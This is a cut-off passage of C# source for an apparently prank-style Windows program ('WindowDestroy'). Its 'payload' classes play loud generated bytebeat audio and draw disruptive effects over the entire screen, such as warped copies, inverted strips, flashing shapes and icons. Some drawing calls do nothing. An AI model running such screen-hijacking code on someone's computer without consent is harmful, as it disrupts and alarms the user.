using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Volleyballene;
using System.Drawing.Drawing2D;
using System.Security.Principal;

internal static class Program
{
    private class bb1 : Payloads
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = 30;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        ((t >> 4) * t & (t >> 3 ^ t >> 4) + (t >> 5 | t >> 2)) | (t * (t >> 3 | t >> 6) >> (t >> 5 | t >> 7) ^ (t >> t) + ((t / 2) * t >> 12))
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
            Thread.Sleep(0);
        }
    }
    private class bb2 : Payloads
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = 22050;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = 30;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        (((t >> 1) * (15 & (0x234568a0 >> ((t >> 8) & 28)))) | ((t >> 1) >> (t >> 15)) ^ (t >> 4)) + ((t >> 50) & (t & 10))
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
            Thread.Sleep(0);
        }
    }
    private class bb3 : Payloads
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = 30;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        (t * (t >> 5 | t >> 8) | t >> 80 ^ t) + 64
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
            Thread.Sleep(0);
        }
    }

    private class bb4 : Payloads
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = 30;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        (t * (t >> 5 | t >> 8) | t >> 80 ^ t) + 64
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
            Thread.Sleep(0);
        }
    }
    private class bb5 : Payloads
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = 30;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        3 * (t >> 6 | t | t >> (t >> 16)) + (7 & t >> 11) * t / 100 * t
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
            Thread.Sleep(0);
        }
    }
    private class bb6 : Payloads
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = 60;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        9 * t & t >> 4 | 5 * t & t >> 7 | 3 * t & t >> 10
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
            Thread.Sleep(0);
        }
    }

    private class payload1 : Payloads
    {
        private static Random random = new Random();
        private int redrawCounter;
        private int codcod;
        private int ballWidth = 100;
        private int ballHeight = 100;
        private int ballPosX = Cursor.Position.X;
        private int ballPosY = Cursor.Position.Y;
        private int moveStepX = 10;
        private int moveStepY = 10;
        private static SolidBrush hbrush = new SolidBrush(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
        private static Rectangle recta = new Rectangle();
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Graphics g = Graphics.FromHdc(hdc);
                int x = screenW;
                int y = screenH;

                g.FillEllipse(hbrush, recta);
                ballPosX += moveStepX;
                if (
                    ballPosX < 0 ||
                    ballPosX + ballWidth > screenW
                    )
                {
                    moveStepX = -moveStepX;
                    hbrush = new SolidBrush(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
                }

                ballPosY += moveStepY;
                if (
                    ballPosY < 0 ||
                    ballPosY + ballHeight > screenH
                    )
                {
                    moveStepY = -moveStepY;
                    hbrush = new SolidBrush(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
                }
                if (redrawCounter >= 360) { redrawCounter = 0; }
                if (codcod >= 360) { codcod = 0; }
            }
            catch { }
            Thread.Sleep(5);
        }
    }

    #region rgb to hsl
    public struct RGB
    {
        private byte _r;
        private byte _g;
        private byte _b;

        public RGB(byte r, byte g, byte b)
        {
            this._r = r;
            this._g = g;
            this._b = b;
        }

        public byte R
        {
            get { return this._r; }
            set { this._r = value; }
        }

        public byte G
        {
            get { return this._g; }
            set { this._g = value; }
        }

        public byte B
        {
            get { return this._b; }
            set { this._b = value; }
        }

        public bool Equals(RGB rgb)
        {
            return (this.R == rgb.R) && (this.G == rgb.G) && (this.B == rgb.B);
        }
    }

    public struct HSL
    {
        private int _h;
        private float _s;
        private float _l;

        public HSL(int h, float s, float l)
        {
            this._h = h;
            this._s = s;
            this._l = l;
        }

        public int H
        {
            get { return this._h; }
            set { this._h = value; }
        }

        public float S
        {
            get { return this._s; }
            set { this._s = value; }
        }

        public float L
        {
            get { return this._l; }
            set { this._l = value; }
        }

        public bool Equals(HSL hsl)
        {
            return (this.H == hsl.H) && (this.S == hsl.S) && (this.L == hsl.L);
        }
    }

    public static RGB HSLToRGB(HSL hsl)
    {
        byte r = 0;
        byte g = 0;
        byte b = 0;

        if (hsl.S == 0)
        {
            r = g = b = (byte)(hsl.L * 255);
        }
        else
        {
            float v1, v2;
            float hue = (float)hsl.H / 360;

            v2 = (hsl.L < 0.5) ? (hsl.L * (1 + hsl.S)) : ((hsl.L + hsl.S) - (hsl.L * hsl.S));
            v1 = 2 * hsl.L - v2;

            r = (byte)(255 * HueToRGB(v1, v2, hue + (1.0f / 3)));
            g = (byte)(255 * HueToRGB(v1, v2, hue));
            b = (byte)(255 * HueToRGB(v1, v2, hue - (1.0f / 3)));
        }

        return new RGB(r, g, b);
    }

    private static float HueToRGB(float v1, float v2, float vH)
    {
        if (vH < 0)
            vH += 1;

        if (vH > 1)
            vH -= 1;

        if ((6 * vH) < 1)
            return (v1 + (v2 - v1) * 6 * vH);

        if ((2 * vH) < 1)
            return v2;

        if ((3 * vH) < 2)
            return (v1 + (v2 - v1) * ((2.0f / 3) - vH) * 6);

        return v1;
    }
    #endregion

    public struct POINT
    {
        public int X;
        public int Y;

        public POINT(int x, int y)
        {
            this.X = x;
            this.Y = y;
        }

        public static implicit operator System.Drawing.Point(POINT p)
        {
            return new System.Drawing.Point(p.X, p.Y);
        }

        public static implicit operator POINT(System.Drawing.Point p)
        {
            return new POINT(p.X, p.Y);
        }
    }


    private class payload2 : Payloads
    {
        private int redrawCounter;
        private int codcod;
        PointF[] lppoint = new PointF[3];
        public override void Draw(IntPtr hdc)
        {
            Graphics g = Graphics.FromHdc(hdc);
            try
            {
                redrawCounter += 1;
                int cc = redrawCounter;
                codcod += 2;
                int cod = codcod;
                HSL data = new HSL(cc, 1f, 0.5f);
                RGB value = HSLToRGB(data);
                HSL data1 = new HSL(cod, 1f, 0.5f);
                RGB value1 = HSLToRGB(data1);
                SolidBrush sb = new SolidBrush(Color.FromArgb(value.R, value.G, value.B));
                Pen pen = new Pen(sb);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
                g.DrawPolygon(pen, lppoint);
            }
            catch { }
        }
    }

    private class payload3 : Payloads
    {
        private int redrawCounter;
        public override void Draw(IntPtr hdc)
        {
            int sx = Screen.PrimaryScreen.Bounds.Width;
            int sy = Screen.PrimaryScreen.Bounds.Height;
            Random r = new Random();
            int y = r.Next(-sy, sy);
            int s = redrawCounter;
            StretchBlt(hdc, 10, 10, sx - 20, sy - 20, hdc, 0, 0, sx, sy, TernaryRasterOperations.SRCPAINT);
            redrawCounter += 200;
            if (redrawCounter >= screenH)
            { redrawCounter = 0; }
            Thread.Sleep(0);
        }
    }

    private class payload4 : Payloads
    {
        private int redrawCounter;
        double angle = 0;
        public override void Draw(IntPtr hdc)
        {
            int sx = Screen.PrimaryScreen.Bounds.Width;
            int sy = Screen.PrimaryScreen.Bounds.Height;
            for (float i = 0F; i < sx + sy; i += 0.99f)
            {
                int a = (int)(Math.Sin(this.angle) * 20);
                BitBlt(hdc, 0, (int)i, sy, 1, hdc, a, (int)i, (int)TernaryRasterOperations.NOTSRCERASE);
                angle += Math.PI / 40;
            }

        }
    }

    private class payload5 : Payloads
    {
        private int redrawCounter;
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Random r = new Random();
                int rx = r.Next(-screenW, screenW);
                int ry = r.Next(-screenH, screenH);
                int rx1 = r.Next(-screenW, screenW);
                int ry1 = r.Next(-screenH, screenH);
                int dest = r.Next(0, 500);
                Point[] lppoint = new Point[3];
                Graphics g = Graphics.FromHdc(hdc);
                System.Drawing.Brush _Brush = new SolidBrush(System.Drawing.Color.FromArgb(100, r.Next(0, 255), r.Next(0, 255), r.Next(0, 255)));
                System.Drawing.SolidBrush myBrush = new System.Drawing.SolidBrush(Color.Pink);
                Pen pen = new Pen(myBrush);
                myBrush.Color = Color.FromArgb(25, r.Next(0, 255), r.Next(0, 255), r.Next(0, 255));
                g.DrawLines(pen, lppoint);
                g.DrawLines(pen, lppoint);
                g.DrawLines(pen, lppoint);
                g.DrawLines(pen, lppoint);
                g.DrawLines(pen, lppoint);
                g.DrawLines(pen, lppoint);
                g.DrawLines(pen, lppoint);
                Thread.Sleep(10);
                g.FillEllipse(myBrush, new Rectangle(rx1, ry1, dest, dest));
                Thread.Sleep(10);
            }
            catch { }
        }
    }

    private class payload6 : Payloads
    {
        private int redrawCounter;
        private int codcod;
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Graphics g = Graphics.FromHdc(hdc);
                redrawCounter += 1;
                int cc = redrawCounter;
                codcod += 2;
                int cod = codcod;
                HSL data = new HSL(cc, 1f, 0.5f);
                RGB value = HSLToRGB(data);
                HSL data1 = new HSL(cod, 1f, 0.5f);
                RGB value1 = HSLToRGB(data1);
                Point[] lppoint = new Point[3];
                SolidBrush sb = new SolidBrush(Color.FromArgb(value.R, value.G, value.B));
                SolidBrush blk = new SolidBrush(Color.Black);
                Pen pen = new Pen(Color.Black, 2);
                Image bruh = WindowDestroy.Properties.Resources.kapi;
                g.DrawImage(bruh, lppoint);
                g.DrawImage(bruh, lppoint);
                g.DrawImage(bruh, lppoint);
                g.DrawImage(bruh, lppoint);
                g.DrawImage(bruh, lppoint);
                g.DrawImage(bruh, lppoint);
                g.DrawImage(bruh, lppoint);
                redrawCounter += 1;
                if (redrawCounter >= 360) { redrawCounter = 0; }
                if (codcod >= 360) { codcod = 0; }
            }
            catch { }
            Thread.Sleep(0);
        }
    }

    public static Image SetOpacity(this Image image, float opacity)
    {
        var colorMatrix = new ColorMatrix();
        colorMatrix.Matrix33 = opacity;
        var imageAttributes = new ImageAttributes();
        imageAttributes.SetColorMatrix(
            colorMatrix,
            ColorMatrixFlag.Default,
            ColorAdjustType.Bitmap);
        var output = new Bitmap(image.Width, image.Height);
        using (var gfx = Graphics.FromImage(output))
        {
            gfx.DrawImage(
                image,
                new Rectangle(0, 0, image.Width, image.Height),
                0,
                0,
                image.Width,
                image.Height,
                GraphicsUnit.Pixel,
                imageAttributes);
        }
        return output;
    }

    private class payload7 : Payloads
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                Graphics g = Graphics.FromHdc(hdc);
                //Create a new bitmap.
                var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                               Screen.PrimaryScreen.Bounds.Height,
                                               PixelFormat.Format32bppArgb);

                // Create a graphics object from the bitmap.
                var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

                // Take the screenshot from the upper left corner to the right bottom corner.
                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                            Screen.PrimaryScreen.Bounds.Y,
                                            0,
                                            0,
                                            Screen.PrimaryScreen.Bounds.Size,
                                            CopyPixelOperation.SourceCopy);
                Image bmp = SetOpacity(bmpScreenshot, 0.5F);
                g.DrawImage(bmp, 0, -5, screenW, screenH + 10);
            }
            catch (Exception ex) { MessageBox.Show(ex.Message, ex.Source); }
        }
    }

    private class payload8 : Payloads
    {
        private int redrawCounter;
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Random r = new Random();
                int rx = r.Next(-screenW, screenW);
                int ry = r.Next(-screenH, screenH);
                int rx1 = r.Next(-screenW, screenW);
                int ry1 = r.Next(-screenH, screenH);
                int dest = r.Next(0, 500);
                Graphics g = Graphics.FromHdc(hdc);
                System.Drawing.Brush _Brush = new SolidBrush(System.Drawing.Color.FromArgb(100, r.Next(0, 255), r.Next(0, 255), r.Next(0, 255)));
                System.Drawing.SolidBrush myBrush = new System.Drawing.SolidBrush(Color.Pink);
                myBrush.Color = Color.FromArgb(25, r.Next(0, 255), r.Next(0, 255), r.Next(0, 255));
                g.FillRectangle(myBrush, new Rectangle(rx, ry, dest, dest));
                Thread.Sleep(10);
                g.FillEllipse(myBrush, new Rectangle(rx1, ry1, dest, dest));
                Thread.Sleep(10);
            }
            catch { }
        }
    }

    [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
   CallingConvention = CallingConvention.StdCall)]
    private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
   out IntPtr piSmallVersion, int amountIcons);
    public static Icon Extract(string file, int number, bool largeIcon)
    {
        IntPtr large;
        IntPtr small;
        ExtractIconEx(file, number, out large, out small, 1);
        try
        {
            return Icon.FromHandle(largeIcon ? large : small);
        }
        catch
        {
            return null;
        }

    }

    private class payload9 : Payloads
    {
        Icon app = Extract("shell32.dll", 2, true);
        Icon warn_ico = Extract("shell32.dll", 235, true);
        Icon no_ico = Extract("imageres.dll", 93, true);
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Graphics g = Graphics.FromHdc(hdc);
                g.DrawIcon(app, random.Next(screenW), random.Next(screenH));
                Thread.Sleep(100);
                g.DrawIcon(warn_ico, random.Next(screenW), random.Next(screenH));
                Thread.Sleep(100);
                g.DrawIcon(no_ico, random.Next(screenW), random.Next(screenH));
                Thread.Sleep(100);
            }
            catch { }
        }
    }

    private class payload10 : Payloads
    {
        private int redrawCounter;
        public override void Draw(IntPtr hdc)
        {
            Random r = new Random();
            int x = Screen.PrimaryScreen.Bounds.X;
            int y = Screen.PrimaryScreen.Bounds.Y;
            PatBlt(hdc, 0, 0, random.Next(screenW), random.Next(screenH), CopyPixelOperation.SourceAnd);
        }
    }

    private class payload11 : Payloads
    {
        private int redrawCounter;

        Image r = WindowDestroy.Properties.Resources.kapi;
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Graphics g = Graphics.FromHdc(hdc);
                g.SmoothingMode = SmoothingMode.AntiAlias;
                g.DrawImage(r, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH));
            }
            catch { }
            Thread.Sleep(0);
        }
        public static Color FromAhsb(int alpha, float hue, float saturation, float brightness)
        {

            if (0 > alpha || 255 < alpha)
            {
                throw new ArgumentOutOfRangeException("alpha", alpha,
                  "Value must be within a range of 0 - 255.");
            }
            if (0f > hue || 360f < hue)
            {
                throw new ArgumentOutOfRangeException("hue", hue,
                  "Value must be within a range of 0 - 360.");
            }
            if (0f > saturation || 1f < saturation)
            {
                throw new ArgumentOutOfRangeException("saturation", saturation,
                  "Value must be within a range of 0 - 1.");
            }
            if (0f > brightness || 1f < brightness)
            {
                throw new ArgumentOutOfRangeException("brightness", brightness,
                  "Value must be within a range of 0 - 1.");
            }

            if (0 == saturation)
            {
                return Color.FromArgb(alpha, Convert.ToInt32(brightness * 255),
                  Convert.ToInt32(brightness * 255), Convert.ToInt32(brightness * 255));
            }

            float fMax, fMid, fMin;
            int iSextant, iMax, iMid, iMin;

            if (0.5 < brightness)
            {
                fMax = brightness - (brightness * saturation) + saturation;
                fMin = brightness + (brightness * saturation) - saturation;
            }
            else
            {
                fMax = brightness + (brightness * saturation);
                fMin = brightness - (brightness * saturation);
            }

            iSextant = (int)Math.Floor(hue / 60f);
            if (300f <= hue)
            {
                hue -= 360f;
            }
            hue /= 60f;
            hue -= 2f * (float)Math.Floor(((iSextant + 1f) % 6f) / 2f);
            if (0 == iSextant % 2)
            {
                fMid = hue * (fMax - fMin) + fMin;
            }
            else
            {
                fMid = fMin - hue * (fMax - fMin);
            }

            iMax = Convert.ToInt32(fMax * 255);
            iMid = Convert.ToInt32(fMid * 255);
            iMin = Convert.ToInt32(fMin * 255);

            switch (iSextant)
            {
                case 1:
                    return Color.FromArgb(alpha, iMid, iMax, iMin);
                case 2:
                    return Color.FromArgb(alpha, iMin, iMax, iMid);
                case 3:
                    return Color.FromArgb(alpha, iMin, iMid, iMax);
                case 4:
                    return Color.FromArgb(alpha, iMid, iMin, iMax);
                case 5:
                    return Color.FromArgb(alpha, iMax, iMin, iMid);
                default:
                    return Color.FromArgb(alpha, iMax, iMid, iMin);
            }
        }
    }

    [DllImport("gdi32.dll")]
    static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
int yMask);

    private class payload12 : Payloads
    {
        private int redrawCounter;
        private int redrawCounter1;
        public override void Draw(IntPtr hdc)
        {
            Random r = new Random();
            int x = Screen.PrimaryScreen.Bounds.X;
            int y = Screen.PrimaryScreen.Bounds.Y;
            int left = Screen.PrimaryScreen.Bounds.Left;
            int top = Screen.PrimaryScreen.Bounds.Top;
            int right = Screen.PrimaryScreen.Bounds.Right;
            int bottom = Screen.PrimaryScreen.Bounds.Bottom;
            POINT[] lppoint = new POINT[3];
            lppoint[0].X = left + (random.Next(screenW));
            lppoint[0].Y = top + (random.Next(screenH));
            lppoint[1].X = right + (random.Next(screenW));
            lppoint[1].Y = top - (random.Next(screenH));
            lppoint[2].X = left + (random.Next(screenW));
            lppoint[2].Y = bottom + (random.Next(screenH));
            PlgBlt(hdc, lppoint, hdc, left - 20, top - 20, right - left + 40, bottom - top + 40, IntPtr.Zero, 0, 0);
        }
    }

    private class payload13 : Payloads
    {
        Image r = WindowDestroy.Properties.Resources.kapi;
        public override void Draw(IntPtr hdc)
        {
            try
            {
                StretchBlt(hdc, screenW + random.Next(-10, 11), random.Next(-10, 11), -screenW + random.Next(-10, 11), screenH + random.Next(-10, 11), hdc, 0 + random.Next(-10, 11), 0 + random.Next(-10, 11), screenW + random.Next(-10, 11), screenH + random.Next(-10, 11), TernaryRasterOperations.SRCCOPY);
            }
            catch { }
            Thread.Sleep(0);
        }
    }

    private class payload14 : Payloads
    {
        private int redrawCounter;
        private int codcod;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                Graphics g = Graphics.FromHdc(hdc);
                redrawCounter += 1;
                int cc = redrawCounter;
                codcod += 2;
                int cod = codcod;
                HSL data = new HSL(cc, 1f, 0.5f);
                RGB value = HSLToRGB(data);
                HSL data1 = new HSL(cod, 1f, 0.5f);
                RGB value1 = HSLToRGB(data1);
                HatchBrush sb = new HatchBrush(HatchStyle.DottedDiamond, Color.FromArgb(value.R, value.G, value.B), Color.Transparent);
                g.FillRectangle(sb, 0, 0, screenW, screenH);
                redrawCounter += 1;
                if (redrawCounter >= 360) { redrawCounter = 0; }
                if (codcod >= 360) { codcod = 0; }
            }
            catch { }
        }
    }

    private class payload15 : Payloads
    {
        private static Random random = new Random();
        private int redrawCounter;
        private int codcod;
        private int ballWidth = 100;
        private int ballHeight = 100;
        private int ballPosX = Cursor.Position.X;
        private int ballPosY = Cursor.Position.Y;
        private int moveStepX = 10;
        private int moveStepY = 10;
        private static Pen pe = new Pen(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));

        public override void Draw(IntPtr hdc)
        {
            try
            {
                Graphics g = Graphics.FromHdc(hdc);
                int x = screenW;
                int y = screenH;

                g.DrawEllipse(pe, ballPosX, ballPosY, ballWidth, ballHeight);
                ballPosX += moveStepX;
                if (
                    ballPosX < 0 ||
                    ballPosX + ballWidth > screenW
                    )
                {
                    moveStepX = -moveStepX;
                    pe = new Pen(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
                }

                ballPosY += moveStepY;
                if (
                    ballPosY < 0 ||
                    ballPosY + ballHeight > screenH
                    )
                {
                    moveStepY = -moveStepY;
                    pe = new Pen(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
                }
                if (redrawCounter >= 360) { redrawCounter = 0; }
                if (codcod >= 360) { codcod = 0; }
            }
            catch { }
            Thread.Sleep(5);
        }
    }

    private class payload16 : Payloads
    {
        private int pl;
        private int ext;
        public override void Draw(IntPtr hdc)
        {
            int plo = pl;
            int str = ext;
            int num = 10;
            int num2 = 100;
            int num3 = random.Next(0, screenW - num);
            int num4 = random.Next(0, screenH - num2);
            BitBlt(hdc, 0, 0 + plo, screenW, 1 + plo, hdc, 5 + str, 0 + plo, 13369376);
            BitBlt(hdc, 0, 1 + plo, screenW, 1 + plo, hdc, -5 - str, 1 + plo, 13369376);
            BitBlt(hdc, 0, 0 + plo * 2, screenW, 1 + plo, hdc, 50, 0 + plo * 2, 13369376);
            BitBlt(hdc, 0, 1 + plo * 2, screenW, 1 + plo, hdc, -50, 1 + plo * 2, 13369376);
            pl += 1;
            if (pl >= screenH) { pl = 0; ext += 25; }
